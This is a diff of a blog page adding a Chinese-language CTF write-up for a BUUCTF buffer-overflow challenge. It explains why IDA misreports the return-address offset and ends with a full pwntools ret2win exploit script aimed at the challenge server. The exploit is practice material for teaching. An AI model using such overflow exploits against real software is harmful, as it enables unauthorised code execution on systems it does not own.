@@ -19,14 +19,22 @@
   <meta name="author" content="">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="题目简介BUUCTF原题，链接见：BUUCTF：jarvisoj_tell_me_something">
+<meta property="og:type" content="article">
 <meta property="og:title" content="不能只在IDA里看偏移">
 <meta property="og:url" content="http://0x4a-210.github.io/2025/08/06/Questions/%E4%B8%8D%E8%83%BD%E5%8F%AA%E5%9C%A8IDA%E9%87%8C%E7%9C%8B%E5%81%8F%E7%A7%BB/index.html">
 <meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介BUUCTF原题，链接见：BUUCTF：jarvisoj_tell_me_something">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q2/IDA-main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q2/checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q2/IDA-good_game.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q2/cyclic.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q2/disas.png">
 <meta property="article:published_time" content="2025-08-06T02:21:11.000Z">
-<meta property="article:modified_time" content="2025-08-06T02:23:51.864Z">
+<meta property="article:modified_time" content="2025-08-07T02:38:02.893Z">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/Questions/Pwn-Q2/IDA-main.png">
   
   
   
@@ -207,7 +215,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          571 words
         
       </span>
     
@@ -218,7 +226,7 @@
         
         
         
-          1 mins
+          5 mins
         
       </span>
     
@@ -260,7 +268,14 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，链接见：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_tell_me_something">BUUCTF：jarvisoj_tell_me_something</a><br></p>
+<span id="more"></span>
+<p>思路倒是不难，但第一次碰到不能在IDA里直接看返回地址的情况，因此记录一下<br></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是进IDA观察反编译：<br><br><img src="/../../photos/Questions/Pwn-Q2/IDA-main.png" srcset="/img/loading.gif" lazyload><br>看到read可以读取0x100个字节，远大于v4长度，存在溢出<br><br>之后checksec查看，如图：<br><br><img src="/../../photos/Questions/Pwn-Q2/checksec.png" srcset="/img/loading.gif" lazyload><br>看到只开启了NX，首先尝试寻找后门函数，点击IDA左侧函数表中每个函数，发现good_game可以输出flag：<br><br><img src="/../../photos/Questions/Pwn-Q2/IDA-good_game.png" srcset="/img/loading.gif" lazyload><br>至此漏洞点分析清楚了：溢出劫持到good_game函数地址即可</p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定good_game地址，有很多方法，objdump、readelf或者直接在IDA里看，最后得到good_game在0x400620<br><br>接下来确定输入区距离返回地址的偏移量，这也是这道题的重点，也是一个容易出错的地方<br><br>从第一张图的IDA反编译结果来看，offset应该&#x3D;0x88+0x8<br><br>但是在pwndbg里使用cyclic方法可以看到偏移&#x3D;0x88<br><br><img src="/../../photos/Questions/Pwn-Q2/cyclic.png" srcset="/img/loading.gif" lazyload><br>这是为什么？通过仔细观察main函数的反汇编结果，可以发现其并不遵守标准的入栈退栈流程，如图所示：<br><br><img src="/../../photos/Questions/Pwn-Q2/disas.png" srcset="/img/loading.gif" lazyload><br>图中的main函数在退栈时没有leave指令，换句话说其没有恢复rbp，而在IDA中获取偏移基于“rbp上方紧邻着返回地址”这一理论，因此本题这种情况下不能直接从IDA反编译的结果中获取偏移<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>offset=<span class="hljs-number">0x88</span><br>winAddr=<span class="hljs-number">0x400620</span><br>retAlignPadding=<span class="hljs-number">0x400469</span><br>LOCAL=<span class="hljs-number">0</span><br>REMOTE=<span class="hljs-number">1</span><br>DEBUG=<span class="hljs-number">2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Attack</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>    <span class="hljs-keyword">elif</span> mode ==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26680</span>)<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x400525&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Input your message:\n&quot;</span>)<br>    payload=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p64(retAlignPadding)+p64(winAddr)<br>    ioTube.send(payload)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;I have received your message, Thank you!\n&quot;</span>)<br>    response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br><br>Attack(REMOTE)<br></code></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>除了本题，还有一道题情况类似，见<a href="https://0x4a-210.github.io/2025/08/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-ciscn-2019-s-3/">BUUCTF题解：ciscn_2019_s_3</a><br><br>从这两题，可以总结出以下结论：<br><br>在确定偏移量之前最好看一下反汇编的结果，对于不遵守标准入栈退栈流程的函数，不能直接从IDA中读出偏移，而是要使用cyclic工具去确定</p>
+
                 
               </div>
             
